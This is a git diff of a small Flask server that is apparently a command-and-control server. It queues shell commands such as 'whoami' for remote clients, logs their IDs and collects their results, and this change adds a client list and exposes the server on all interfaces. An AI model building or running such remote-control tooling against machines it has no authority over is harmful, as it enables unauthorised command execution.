@@ -9,8 +9,7 @@ print("Drew was here")
 current_command = "whoami" # have something as the default command, just making sure that connection is maintained.
 client_commands = {} # 'client_id': ['command1', 'command2'], etc.
 # client_commands is a bad name
-clients = {}
-
+clients = []
 
 @app.route('/home')
 def home():
@@ -47,6 +46,7 @@ def log_client():
     client_id = request.args.get('client_id')
     # client_id = "test"
     print(client_id)
+    clients.append(client_id)
     # client_commands[client_id] = "whoami" # init?
     # return jsonify(client_id=client_id, command="hostname -I")
     return jsonify(client_id=client_id)
@@ -61,7 +61,11 @@ def command_result():
     print(f"client is {status}") # hell yeah maybe put this somewhere else    or take it away altogether cause its in the POST header
     return jsonify({"status": "success"})
 
+@app.route('/clients')
+def show_clients():
+    return clients
+
 
 if __name__ == '__main__':
-    app.run(debug=True, host='127.0.0.1', port=5000, threaded=True)
+    app.run(debug=True, host='0.0.0.0', port=5005, threaded=True)
     # app.run(host='127.0.0.1', port=5000, threaded=True)
